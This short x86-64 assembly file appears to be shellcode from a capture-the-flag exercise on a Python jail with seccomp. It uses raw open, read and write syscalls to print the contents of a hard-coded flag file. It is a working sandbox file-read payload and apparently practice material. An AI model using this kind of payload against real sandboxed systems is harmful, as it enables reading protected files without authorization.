[BITS 64]
global main

section .text
main: 
    mov rax, 2
    lea rdi, [rel flag]
    mov rsi, 0
    mov rdx, 0
    syscall

    mov rdi, rax
    mov rsi, rsp
    mov rdx, 100
    mov rax, 0
    syscall

    mov rdi, 1
    mov rsi, rsp
    mov rdx, 100
    mov rax, 1
    syscall

section .data
    flag: db "/home/tourpran/Download/all-my-pwn-work/python-jail-seccomp/flag-0d27230887e55ab85939af13dce0c76b.txt", 0 